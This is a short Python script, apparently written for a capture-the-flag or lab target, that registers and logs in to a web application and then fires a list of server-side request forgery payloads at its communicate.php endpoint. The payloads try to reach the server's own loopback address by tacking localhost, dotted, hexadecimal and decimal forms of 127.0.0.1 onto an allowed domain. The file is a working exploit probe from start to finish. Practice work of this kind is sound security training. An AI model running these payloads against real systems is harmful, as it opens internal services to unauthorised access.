#!/usr/bin/env python3
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Create session
session = requests.Session()
username = random_string()
password = random_string()

# Register
data = {'name': 'testuser', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)

# Login
data = {'username': username, 'password': password}
session.post(f"{TARGET}/login.php", data=data)

print(f"[*] Logged in as {username}:{password}")

# Test SSRF with different URLs
test_urls = [
    "http://motherland.com/",
    "http://localhost.motherland.com/",
    "http://127.0.0.1.motherland.com/",
    "http://0x7f000001.motherland.com/",
    "http://2130706433.motherland.com/",  # 127.0.0.1 in decimal
]

for test_url in test_urls:
    print(f"\n[*] Testing URL: {test_url}")
    data = {
        'url': test_url,
        'data': {'test': 'value'}
    }
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data, timeout=5)
        print(f"    Status: {resp.status_code}")
        if "error" in resp.text.lower() or "wrong" in resp.text.lower():
            print(f"    Error detected")
        if len(resp.text) > 0:
            # Print first 200 chars
            print(f"    Response preview: {resp.text[:200]}")
    except Exception as e:
        print(f"    Exception: {e}")
